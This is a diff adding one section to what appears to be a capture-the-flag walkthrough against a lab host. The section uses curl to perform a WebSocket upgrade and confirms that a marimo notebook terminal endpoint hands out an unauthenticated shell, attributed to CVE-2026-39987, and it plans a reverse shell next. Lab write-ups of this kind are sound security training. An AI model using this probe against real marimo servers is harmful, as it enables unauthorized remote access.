@@ -1977,6 +1977,122 @@ Ordinary GET requests cannot distinguish a WebSocket route from an absent one. A
 <div align="center">
 <br>
 <br>
+※※※※※※※※※※※※※※※※※※※※※※※※
+<br>
+<br>
+<br>
+</div>
+
+### 3.12 Confirm the pre-authentication WebSocket terminal
+
+**Why this step:**  
+A plain GET to `/terminal/ws` returns 404 regardless of whether the route exists, since Starlette matches routes by scope type (3.11). Attempt the protocol upgrade directly to determine whether the endpoint is present and whether it requires authentication.
+
+**Command:**
+
+bash
+
+```bash
+# First attempt — malformed key
+curl -sk -i \
+  -H "Connection: Upgrade" \
+  -H "Upgrade: websocket" \
+  -H "Sec-WebSocket-Version: 13" \
+  -H "Sec-WebSocket-Key: SGVsbG8sIHdvcmxkIQ==" \
+  https://nb-1be3782a8afd3ad5.cohort.htb/terminal/ws
+
+# Corrected — RFC-compliant 16-byte key
+KEY=$(head -c 16 /dev/urandom | base64)
+echo "$KEY"
+curl -sk -i \
+  -H "Connection: Upgrade" \
+  -H "Upgrade: websocket" \
+  -H "Sec-WebSocket-Version: 13" \
+  -H "Sec-WebSocket-Key: $KEY" \
+  https://nb-1be3782a8afd3ad5.cohort.htb/terminal/ws
+```
+
+**Breakdown:**
+
+|Component|Purpose|
+|---|---|
+|`-H "Connection: Upgrade"`|Requests that the connection switch protocols rather than complete as a normal HTTP exchange.|
+|`-H "Upgrade: websocket"`|Names the protocol to switch to.|
+|`-H "Sec-WebSocket-Version: 13"`|The RFC 6455 protocol version. Version 13 is the only one in general use; other values are rejected.|
+|`-H "Sec-WebSocket-Key: $KEY"`|A 16-byte random nonce, base64-encoded. Length is validated by the server.|
+|`head -c 16 /dev/urandom`|Reads exactly 16 bytes from the kernel's random source. The byte count is not arbitrary — RFC 6455 mandates 16.|
+|`base64`|Encodes those bytes, producing a 24-character string ending in `==`.|
+|No credential headers|Deliberate. No cookie, token, or authorization header is sent, so a successful upgrade demonstrates the endpoint is unauthenticated.|
+
+**Result — first attempt:**
+
+```
+HTTP/1.1 400 Bad Request
+Server: nginx/1.24.0 (Ubuntu)
+Date: Wed, 09 Sep 2026 11:09:02 GMT
+Content-Type: text/plain
+Content-Length: 95
+Connection: keep-alive
+
+Failed to open a WebSocket connection: invalid Sec-WebSocket-Key header: SGVsbG8sIHdvcmxkIQ==.
+```
+
+The key used was `SGVsbG8sIHdvcmxkIQ==`, which decodes to the 13-byte ASCII string `Hello, world!`. RFC 6455 requires exactly 16 decoded bytes, and the server validated the length before proceeding.
+
+This error is itself a positive result. A nonexistent route returns a generic 404 (3.11); only a live WebSocket handler parses the handshake and reports a specific defect in it.
+
+**Result — corrected key:**
+
+```
+OQT8z/p6I/j+9DjGbv8SFA==
+```
+
+```
+HTTP/1.1 101 Switching Protocols
+Server: nginx/1.24.0 (Ubuntu)
+Date: Wed, 09 Sep 2026 11:10:42 GMT
+Connection: upgrade
+Upgrade: websocket
+Sec-WebSocket-Accept: e1WeiNjxwOvSUMS/9HAD9u5YSp0=
+
+<binary framing>Hmarimo@cohort:~$ <binary framing>keepalive ping timeout
+```
+
+**Analysis:**
+
+|Observation|Significance|
+|---|---|
+|`101 Switching Protocols`|The upgrade was accepted. The connection is now a WebSocket.|
+|`Sec-WebSocket-Accept` present|The server performed the RFC 6455 key transformation, confirming a genuine handshake implementation rather than a proxy passing bytes blindly.|
+|`marimo@cohort:~$` in the payload|**A shell prompt.** The endpoint opened an interactive terminal session and transmitted its banner unprompted.|
+|No credentials sent|No cookie, token, or authorization header accompanied the request. The endpoint requires none.|
+|Binary noise around the text|WebSocket frame headers — opcode, mask bit, and payload length preceding each message. curl prints these raw as it has no frame parser.|
+|`keepalive ping timeout`|The server closed the connection after curl failed to answer protocol-level ping frames, which a WebSocket client is required to do.|
+
+###### Theory — what the shell prompt establishes, and why curl cannot go further:
+
+The banner `marimo@cohort:~$` is the standard bash prompt format `user@host:cwd$`. Its arrival identifies three facts at once: the terminal session is live, it runs as the user **marimo**, and the host is named **cohort**. The endpoint is not merely reachable — it has already spawned a shell and is waiting for input.
+
+Set against the authentication situation, the severity is clear. Marimo's only access control is the token login at `/auth/login` (3.4). That gate was never approached. An endpoint that hands an anonymous network client a shell prompt has not been weakened; it has been bypassed in its entirety. This is the behaviour the reference material attributes to **CVE-2026-39987**, and the observation above confirms it independently of that source.
+
+curl's limitation is structural rather than incidental. Once a connection upgrades, HTTP ends and the WebSocket framing protocol begins: every message is wrapped in a header carrying an opcode, a mask flag, and a length field, and clients must mask payloads and reply to server pings with pongs. curl performs the handshake because the handshake is HTTP, but it has no frame encoder, no frame decoder, and no ping handler. It can therefore prove the endpoint exists and read the raw bytes of what arrives, but cannot send a command or hold the session open — hence the ping timeout.
+
+Proceeding requires a client that implements the framing layer.
+
+**What this gives you:**
+
+**Key findings:**
+
+- **`/terminal/ws` accepts an unauthenticated WebSocket upgrade and returns a live shell prompt.** No credentials of any kind were supplied. CVE-2026-39987 is confirmed by direct observation on this target rather than accepted from reference material.
+- **Command execution will run as the user `marimo` on host `cohort`**, per the prompt banner.
+- **The server validates `Sec-WebSocket-Key` length**, requiring exactly 16 decoded bytes. Malformed keys return a descriptive `400`, which — unlike the ambiguous 404 in 3.11 — positively confirms a WebSocket handler at the path.
+- **curl cannot drive the session.** It completes the handshake but implements no frame encoding or ping response, and the server terminates the connection on keepalive timeout.
+
+**Next:**  
+The endpoint is confirmed and unauthenticated. Use a WebSocket-capable client to send a command and verify code execution before attempting a reverse shell.
+<div align="center">
+<br>
+<br>
 ※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
 <br>
 </div>
